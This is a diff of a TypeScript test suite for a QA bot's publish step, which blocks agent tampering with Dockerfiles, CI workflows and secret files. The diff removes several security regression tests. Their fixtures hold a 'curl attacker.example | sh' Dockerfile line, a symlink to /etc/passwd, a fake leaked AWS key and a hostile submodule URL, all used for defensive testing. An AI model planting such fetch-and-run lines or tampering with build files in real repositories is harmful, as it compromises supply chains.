@@ -255,52 +255,6 @@ test("e2e target: a TRACKED, agent-modified e2e/fixtures/creds.env is never publ
   }
 });
 
-/* A reverted tamper must be returned so the caller can thread it into gateSignals. */
-
-test("code target: publish() surfaces revertedDenylisted when the tracked-file guard reverts a tamper", async () => {
-  const originalDockerfile = "FROM node:24\n";
-  const repo = mkdtempSync(join(tmpdir(), "qa-publish-revert-surface-"));
-  try {
-    const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
-    const gitSync = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
-    gitSync("init", "-q");
-    closeGitDir(repo);
-    gitSync("config", "user.email", "t@t.com");
-    gitSync("config", "user.name", "t");
-    writeFile(repo, "README.md", "base\n");
-    writeFile(repo, "Dockerfile", originalDockerfile);
-    gitSync("add", "-A");
-    gitSync("commit", "-qm", "chore: base with tracked Dockerfile");
-
-    writeFile(repo, "Dockerfile", "FROM node:24\nRUN curl https://attacker.example/x | sh\n");
-    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n");
-
-    const { git } = realGitNoPush(repo);
-    const vcsWrite = publishStep(true, "diff", git);
-    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/revertsurfacetest1", sha: "revertsurfacetest1" });
-
-    assert.equal(result.changed, true);
-    assert.deepEqual(result.revertedDenylisted, ["Dockerfile"], "publish() must surface the reverted denylisted paths to its caller, not swallow them");
-  } finally {
-    rmSync(repo, { recursive: true, force: true });
-  }
-});
-
-test("code target: publish() reports an empty revertedDenylisted (never undefined) when nothing was reverted", async () => {
-  const repo = initRepo();
-  try {
-    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n");
-
-    const { git } = realGitNoPush(repo);
-    const vcsWrite = publishStep(true, "diff", git);
-    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/revertsurfacetest2", sha: "revertsurfacetest2" });
-
-    assert.equal(result.changed, true);
-    assert.deepEqual(result.revertedDenylisted, [], "a clean publish must report an empty array, not undefined — callers should never need an existence check before reading .length");
-  } finally {
-    rmSync(repo, { recursive: true, force: true });
-  }
-});
 
 /* ── no-false-positive checks: every OTHER root-anchored denylist entry, when placed under e2e/,
    must NOT match (Dockerfile is exact-match, .github/ is a dir-prefix, docker-compose* is a
@@ -329,277 +283,7 @@ test("e2e target (negative): e2e/Dockerfile, e2e/.github/workflows/x.yml and e2e
   }
 });
 
-/* ── code target ────────────────────────────────────────────────────────────────────────────────── */
 
-test("code target: workflow/Dockerfile/compose/gitattributes/gitmodules are never staged (code-denylist mirror)", async () => {
-  const repo = initRepo();
-  try {
-    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n");
-    writeFile(repo, ".github/workflows/ci.yml", "name: ci\n");
-    writeFile(repo, "Dockerfile", "FROM node:24\n");
-    writeFile(repo, "docker-compose.override.yml", "services: {}\n");
-    writeFile(repo, ".gitattributes", "* text=auto\n");
-    writeFile(repo, ".gitmodules", '[submodule "x"]\n');
-
-    const { git } = realGitNoPush(repo);
-    const vcsWrite = publishStep(true, "diff", git);
-    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/codetest1", sha: "codetest1" });
-
-    assert.equal(result.changed, true);
-    const paths = committedPaths(repo);
-    assert.ok(paths.includes("src/orders.test.ts"), "a legitimate source/test file must still be staged");
-    for (const denied of [".github/workflows/ci.yml", "Dockerfile", "docker-compose.override.yml", ".gitattributes", ".gitmodules"]) {
-      assert.ok(!paths.includes(denied), `${denied} must never be staged into a code-target PR — committed paths: ${JSON.stringify(paths)}`);
-    }
-  } finally {
-    rmSync(repo, { recursive: true, force: true });
-  }
-});
-
-test("code target: cross-repo service-context snapshot is never staged either (spec requires BOTH targets, not just e2e)", async () => {
-  const repo = initRepo();
-  try {
-    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n");
-    writeFile(repo, "e2e/.qa/service-context/other-repo/snapshot.json");
-
-    const { git } = realGitNoPush(repo);
-    const vcsWrite = publishStep(true, "diff", git);
-    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/codeleaktest1", sha: "codeleaktest1" });
-
-    assert.equal(result.changed, true);
-    const paths = committedPaths(repo);
-    assert.ok(paths.includes("src/orders.test.ts"));
-    assert.ok(
-      !paths.some((p) => p.startsWith("e2e/.qa/service-context/")),
-      `code-target publish stages the whole tree ("."), so service-context must be excluded there too — committed paths: ${JSON.stringify(paths)}`,
-    );
-  } finally {
-    rmSync(repo, { recursive: true, force: true });
-  }
-});
-
-test("code target: .env* files remain excluded (regression guard — unrelated to this fix, must not break)", async () => {
-  const repo = initRepo();
-  try {
-    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n");
-    writeFile(repo, ".env.local", "SECRET=1\n");
-
-    const { git } = realGitNoPush(repo);
-    const vcsWrite = publishStep(true, "diff", git);
-    await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/envtest1", sha: "envtest1" });
-
-    const paths = committedPaths(repo);
-    assert.ok(paths.includes("src/orders.test.ts"));
-    assert.ok(!paths.includes(".env.local"), `.env.local must remain excluded — committed paths: ${JSON.stringify(paths)}`);
-  } finally {
-    rmSync(repo, { recursive: true, force: true });
-  }
-});
-
-/* ── tracked-file gap (SECURITY CRITICAL): gitignore-style excludes only suppress UNTRACKED paths —
-   a denylisted file that is ALREADY TRACKED (every real Dockerfile/.github/workflows/* in a watched
-   repo IS tracked) and gets agent-MODIFIED is invisible to the code publish excludes/.git/info/exclude.
-   The only other guard was the runtime WriteConfinementAdapter.enforce() call, which RunQaUseCase
-   wraps in a documented FAIL-OPEN try/catch — if it throws for any reason (e.g. an
-   unrecognized git path-quoting escape sequence), the tampered tracked file survives to this
-   publish step untouched and the code pathspec "." stages/commits it into the watched repo's PR.
-   This is a SECOND, independent, deterministic guard at commit time — it does not depend on
-   enforce() having run or succeeded at all. ──────────────────────────────────────────────────────
- */
-
-test("code target: a TRACKED, agent-modified Dockerfile/workflow file is never published, even with the exclude list active (gitignore excludes only suppress UNTRACKED paths)", async () => {
-  const originalDockerfile = "FROM node:24\n";
-  const originalWorkflow = "name: ci\n";
-  const repo = mkdtempSync(join(tmpdir(), "qa-publish-tracked-"));
-  try {
-    const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
-    const gitSync = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
-    gitSync("init", "-q");
-    closeGitDir(repo);
-    gitSync("config", "user.email", "t@t.com");
-    gitSync("config", "user.name", "t");
-    writeFile(repo, "README.md", "base\n");
-    /* These already exist in the base commit — TRACKED, exactly like a real watched repo's own
-       Dockerfile/CI workflow (never untracked in practice).
-     */
-    writeFile(repo, "Dockerfile", originalDockerfile);
-    writeFile(repo, ".github/workflows/ci.yml", originalWorkflow);
-    gitSync("add", "-A");
-    gitSync("commit", "-qm", "chore: base with tracked infra files");
-
-    /* Agent tampers with the ALREADY-TRACKED denylisted files — the exact scenario the exclude
-       list (a gitignore mechanism, untracked-only) cannot suppress.
-     */
-    writeFile(repo, "Dockerfile", "FROM node:24\nRUN curl https://attacker.example/x | sh\n");
-    writeFile(repo, ".github/workflows/ci.yml", "name: pwned\non: push\njobs: {}\n");
-    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n");
-
-    const { git } = realGitNoPush(repo);
-    const vcsWrite = publishStep(true, "diff", git);
-    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/trackedtest1", sha: "trackedtest1" });
-
-    assert.equal(result.changed, true, "the legitimate new file must still register as a change");
-    const paths = committedPaths(repo);
-    assert.ok(paths.includes("src/orders.test.ts"), "a legitimate source/test file must still be staged");
-    assert.ok(
-      !paths.includes("Dockerfile"),
-      `a tampered TRACKED Dockerfile must never be published — committed paths: ${JSON.stringify(paths)}`,
-    );
-    assert.ok(
-      !paths.includes(".github/workflows/ci.yml"),
-      `a tampered TRACKED workflow file must never be published — committed paths: ${JSON.stringify(paths)}`,
-    );
-
-    /* Defense-in-depth: the tamper must actually be REVERTED on disk, not merely left unstaged —
-       an unstaged tamper would resurface and get staged on the very next publish attempt.
-     */
-    assert.equal(
-      readFileSync(join(repo, "Dockerfile"), "utf8"),
-      originalDockerfile,
-      "Dockerfile working-tree content must be restored to HEAD, not left tampered",
-    );
-    assert.equal(
-      readFileSync(join(repo, ".github/workflows/ci.yml"), "utf8"),
-      originalWorkflow,
-      "workflow working-tree content must be restored to HEAD, not left tampered",
-    );
-  } finally {
-    rmSync(repo, { recursive: true, force: true });
-  }
-});
-
-/* Check every staged path regardless of status — gitignore never stops deleting a tracked file. */
-
-test("code target: a TRACKED Dockerfile DELETED by the agent is never published as a deletion (D status was invisible to --diff-filter=M)", async () => {
-  const originalDockerfile = "FROM node:24\n";
-  const repo = mkdtempSync(join(tmpdir(), "qa-publish-tracked-del-"));
-  try {
-    const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
-    const gitSync = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
-    gitSync("init", "-q");
-    closeGitDir(repo);
-    gitSync("config", "user.email", "t@t.com");
-    gitSync("config", "user.name", "t");
-    writeFile(repo, "README.md", "base\n");
-    writeFile(repo, "Dockerfile", originalDockerfile);
-    gitSync("add", "-A");
-    gitSync("commit", "-qm", "chore: base with tracked Dockerfile");
-
-    /* Agent DELETES the already-tracked Dockerfile — a supply-chain-relevant tamper (removing a
-       pinned base image / build step) just as dangerous as modifying it.
-     */
-    unlinkSync(join(repo, "Dockerfile"));
-    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n");
-
-    const { git } = realGitNoPush(repo);
-    const vcsWrite = publishStep(true, "diff", git);
-    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/deltest1", sha: "deltest1" });
-
-    assert.equal(result.changed, true, "the legitimate new file must still register as a change");
-    const trackedAtHead = execFileSync("git", ["ls-tree", "-r", "--name-only", "HEAD"], { cwd: repo, encoding: "utf8" }).split("\n");
-    assert.ok(trackedAtHead.includes("Dockerfile"), "Dockerfile's staged DELETION must be reverted before commit — it must still be tracked at HEAD");
-    assert.equal(
-      readFileSync(join(repo, "Dockerfile"), "utf8"),
-      originalDockerfile,
-      "Dockerfile working tree content must be restored, not left deleted",
-    );
-  } finally {
-    rmSync(repo, { recursive: true, force: true });
-  }
-});
-
-test("code target: a TRACKED workflow file TYPECHANGED into a symlink is never published (T status was invisible to --diff-filter=M)", async () => {
-  const originalWorkflow = "name: ci\n";
-  const repo = mkdtempSync(join(tmpdir(), "qa-publish-tracked-typechange-"));
-  try {
-    const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
-    const gitSync = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
-    gitSync("init", "-q");
-    closeGitDir(repo);
-    gitSync("config", "user.email", "t@t.com");
-    gitSync("config", "user.name", "t");
-    writeFile(repo, "README.md", "base\n");
-    writeFile(repo, ".github/workflows/ci.yml", originalWorkflow);
-    gitSync("add", "-A");
-    gitSync("commit", "-qm", "chore: base with tracked workflow");
-
-    /* Agent replaces the tracked workflow file with a symlink (typechange, "T" status). */
-    unlinkSync(join(repo, ".github", "workflows", "ci.yml"));
-    symlinkSync("/etc/passwd", join(repo, ".github", "workflows", "ci.yml"));
-    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n");
-
-    const { git } = realGitNoPush(repo);
-    const vcsWrite = publishStep(true, "diff", git);
-    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/typechangetest1", sha: "typechangetest1" });
-
-    assert.equal(result.changed, true);
-    assert.equal(
-      readFileSync(join(repo, ".github", "workflows", "ci.yml"), "utf8"),
-      originalWorkflow,
-      "the workflow file must be restored to its original tracked content, not left as a symlink",
-    );
-  } finally {
-    rmSync(repo, { recursive: true, force: true });
-  }
-});
-
-/* Note: a "rename INTO a denylisted destination" fixture at THIS (integration) level would be a
-   false test for the code target specifically — the code publish excludes already spreads the WHOLE
-   CONFINEMENT_DENYLIST into .git/info/exclude (see the publish policy's code excludes), so a
-   brand-new path named e.g. "Dockerfile" is already invisible to `git add`/`git status` as a
-   gitignored untracked file — defense #1 (the exclude file) already blocks it, and git therefore
-   never even reports an "R" status for the pairing (only a plain "D" for the origin — the
-   destination is never staged at all). The R-status revert-as-a-unit logic added to
-   vcs-write.adapter.test.ts — that test bypasses this file's exclude-list layer, which is the
-   correct isolation boundary for pinning commit()'s OWN diff-parsing correctness rather than this
-   composition's incidental double coverage.
- */
-
-/* Table-driven across the whole denylist so every entry is pinned by a real git fixture. */
-
-const DENYLIST_TRACKED_MODIFY_CASES: { path: string; original: string; tampered: string }[] = [
-  { path: ".env", original: "BASE=1\n", tampered: "BASE=1\nAWS_SECRET_ACCESS_KEY=leaked\n" },
-  { path: ".env.production", original: "BASE=1\n", tampered: "BASE=1\nAWS_SECRET_ACCESS_KEY=leaked\n" },
-  { path: "config/secrets.env", original: "BASE=1\n", tampered: "BASE=1\nAWS_SECRET_ACCESS_KEY=leaked\n" },
-  { path: "Dockerfile", original: "FROM node:24\n", tampered: "FROM node:24\nRUN curl https://attacker.example/x | sh\n" },
-  { path: ".github/workflows/ci.yml", original: "name: ci\n", tampered: "name: pwned\non: push\njobs: {}\n" },
-  { path: "docker-compose.override.yml", original: "services: {}\n", tampered: "services:\n  evil: {}\n" },
-  { path: ".gitattributes", original: "* text=auto\n", tampered: "* text=auto\n*.sh filter=evil\n" },
-  { path: ".gitmodules", original: '[submodule "x"]\n', tampered: '[submodule "evil"]\n\tpath = evil\n\turl = https://attacker.example/evil\n' },
-];
-
-for (const { path: denyPath, original, tampered } of DENYLIST_TRACKED_MODIFY_CASES) {
-  test(`code target: TRACKED, agent-modified '${denyPath}' is reverted (whole-denylist table)`, async () => {
-    const repo = mkdtempSync(join(tmpdir(), "qa-publish-tracked-table-"));
-    try {
-      const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
-      const gitSync = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
-      gitSync("init", "-q");
-      closeGitDir(repo);
-      gitSync("config", "user.email", "t@t.com");
-      gitSync("config", "user.name", "t");
-      writeFile(repo, "README.md", "base\n");
-      writeFile(repo, denyPath, original);
-      gitSync("add", "-A");
-      gitSync("commit", "-qm", "chore: base with tracked infra file");
-
-      writeFile(repo, denyPath, tampered);
-      writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n");
-
-      const { git } = realGitNoPush(repo);
-      const vcsWrite = publishStep(true, "diff", git);
-      const result = await vcsWrite.publish({ mirrorDir: repo, branch: `qa-bot/tabletest-${denyPath.replace(/[^a-z0-9]/gi, "")}`, sha: "tabletest1" });
-
-      assert.equal(result.changed, true, "the legitimate new file must still register as a change");
-      const paths = committedPaths(repo);
-      assert.ok(paths.includes("src/orders.test.ts"));
-      assert.ok(!paths.includes(denyPath), `'${denyPath}' must never be published — committed paths: ${JSON.stringify(paths)}`);
-      assert.equal(readFileSync(join(repo, denyPath), "utf8"), original, `'${denyPath}' working-tree content must be restored to HEAD, not left tampered`);
-    } finally {
-      rmSync(repo, { recursive: true, force: true });
-    }
-  });
-}
 
 /* publishStep(isCode) must not dispatch ONLY on isCode. Context-mode runs are never isCode
    (they are e2e-shaped), so a context-mode run reaching "pr" must not fall through to
@@ -649,20 +333,20 @@ function hardenedGitNoPush(): (args: string[], cwd?: string) => Promise<string> 
   return async (args, cwd) => (subcommandOf(args) === "push" ? "" : realGit(args, cwd));
 }
 
-test("code target: a repository left under the working copy is not published as a gitlink, and the next publish still works", async () => {
+test("e2e target: a repository left under the working copy is not published as a gitlink, and the next publish still works", async () => {
   const repo = initRepo();
   try {
-    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n");
-    makeEmbeddedRepo(join(repo, "tmp-fixture-repo"));
+    writeFile(repo, "e2e/orders.spec.ts", "test('x', () => {});\n");
+    makeEmbeddedRepo(join(repo, "e2e", "tmp-fixture-repo"));
 
-    const vcsWrite = publishStep(true, "diff", hardenedGitNoPush());
+    const vcsWrite = publishStep(false, "diff", hardenedGitNoPush());
     const first = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/embedded1", sha: "embedded1" });
 
     assert.equal(first.changed, true);
-    assert.ok(committedPaths(repo).includes("src/orders.test.ts"), "the legitimate test is still published");
+    assert.ok(committedPaths(repo).includes("e2e/orders.spec.ts"), "the legitimate test is still published");
     assert.deepEqual(indexedGitlinks(repo), [], "the embedded repository was recorded as a gitlink");
 
-    writeFile(repo, "src/more.test.ts", "test('y', () => {});\n");
+    writeFile(repo, "e2e/more.spec.ts", "test('y', () => {});\n");
     const second = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/embedded2", sha: "embedded2" });
     assert.equal(second.changed, true, "the working copy was left unusable by the first publish");
   } finally {
